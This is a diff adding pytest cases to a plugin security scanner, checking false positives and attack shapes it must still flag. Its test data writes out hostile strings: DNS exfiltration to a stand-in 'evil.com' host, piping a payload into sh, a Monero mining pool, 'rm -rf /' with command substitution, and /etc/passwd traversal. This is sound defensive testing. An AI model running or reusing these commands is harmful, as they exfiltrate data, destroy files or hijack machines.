@@ -814,3 +814,55 @@ class TestIntakeFalsePositiveRound2:
         result = scan_plugin(_mk_plugin(tmp_path, files), source="owner/repo")
         sev = {f.file: f.severity for f in result.findings if f.pattern_id == "hex_encoded_string"}
         assert sev == {"desktop/plugin.js": "medium", "mix.py": "medium", "tests/test_audio.py": "medium"}
+
+
+
+class TestIntakeFalsePositiveRound3:
+    """Shapes from the 2026-10-01 catalog sweep that scored on clean pins: ``monero`` as a keyword
+    in a connector index, ``host`` as an English noun / HTTP header beside an interpolation,
+    ``| sha256sum`` read as ``| sh``, ``sudo`` inside a translation table, ``db.exec('PRAGMA …')``,
+    ``$(…)``/backticks INSIDE a Python test literal read as an exec marker, and a docs reinstall
+    step removing the plugin's own ``~/.hermes/plugins/<name>``. The same tokens in their attack
+    shape keep their severity."""
+
+    @pytest.mark.parametrize("rel,text,pattern_id,severity", [
+        ("tools/skill_shortlist.json", '{\n"anchors":"adopt chat crypto monero multimodal xmr"\n}\n', "crypto_mining", "medium"),
+        ("routing.py", 'KEYWORDS = (\n    "monero gateway",\n)\n', "crypto_mining", "medium"),
+        ("plugin.js", "const m = ` written on the connected host (${connectionId}) but read here.`\n", "dns_exfil", None),
+        ("src/host-bridge.js", "if (!resp.ok) return { error: `host ${resp.status}: ${text}` }\n", "dns_exfil", None),
+        ("nginx.conf", "    proxy_set_header Host $host;\n", "dns_exfil", None),
+        ("verify.sh", 'echo "bc2b8902  .staging/rtk.tar.gz" | sha256sum -c -\n', "echo_pipe_exec", None),
+        ("tips_zh.json", '{\n  "en": "Bare sudo commands are auto-rewritten.",\n  "tips": [\n    "单独的 sudo 命令会自动改写",\n  ]\n}\n', "sudo_usage", "medium"),
+        ("monitor.js", "db.exec('PRAGMA busy_timeout=2000');\ntry { db?.exec('ROLLBACK'); } catch {}\n", "exec_string", None),
+        ("tests/test_security.py", "HOSTILE = {\"meta\": '; rm -rf / ; $(whoami) `id` | cat'}\n", "destructive_root_rm", "medium"),
+        ("tests/test_security.py", 'IDS = ("$(id)", "`id`", "../../../etc/passwd")\n', "system_passwd_access", "medium"),
+        ("docs/dashboard-plugin.md", "```bash\nrm -rf ~/.hermes/plugins/tool-slimmer\ncp -R x ~/.hermes/plugins/tool-slimmer\n```\n", "destructive_home_rm", "medium"),
+    ])
+    def test_inert_shape_no_longer_prompts(self, tmp_path, rel, text, pattern_id, severity):
+        files = dict(BASE_FILES)
+        files[rel] = text
+        result = scan_plugin(_mk_plugin(tmp_path, files), source="owner/repo")
+        sevs = {f.severity for f in result.findings if f.pattern_id == pattern_id}
+        assert sevs == ({severity} if severity else set()), format_scan_report(result)
+        assert result.verdict == "safe"
+
+    @pytest.mark.parametrize("rel,text,pattern_id,severity", [
+        ("run.sh", "host $(whoami).evil.com\n", "dns_exfil", "critical"),
+        ("run.sh", "for c in $CHUNKS; do host $c; done\n", "dns_exfil", "critical"),
+        ("run.sh", "echo $PAYLOAD | sh\n", "echo_pipe_exec", "critical"),
+        ("miner.py", 'CFG = {"coin": "monero", "pool": "gulf.moneroocean.stream:10128"}\n', "crypto_mining", "critical"),
+        ("cfg.json", '{\n  "note": "randomx monero miner"\n}\n', "crypto_mining", "critical"),
+        ("x.py", 'exec("import os")\n', "exec_string", "high"),
+        ("tips.json", '{\n  "tip": "sudo rm -rf /opt/x"\n}\n', "sudo_usage", "high"),
+        ("hooks.json", '{\n  "command": "please run sudo id"\n}\n', "sudo_usage", "high"),
+        ("mcp.json", '{\n  "args": [\n    "sudo",\n    "id"\n  ]\n}\n', "sudo_usage", "high"),
+        ("tests/test_x.py", "os.system('rm -rf / ; $(whoami)')\n", "destructive_root_rm", "high"),
+        ("docs/x.md", "rm -rf ~/.hermes\n", "destructive_home_rm", "high"),
+        ("uninstall.sh", "rm -rf ~/.hermes/plugins/test-plugin\n", "destructive_home_rm", "critical"),
+    ])
+    def test_attack_shape_keeps_severity(self, tmp_path, rel, text, pattern_id, severity):
+        files = dict(BASE_FILES)
+        files[rel] = text
+        result = scan_plugin(_mk_plugin(tmp_path, files), source="owner/repo")
+        sevs = {f.severity for f in result.findings if f.pattern_id == pattern_id}
+        assert sevs == {severity}, format_scan_report(result)
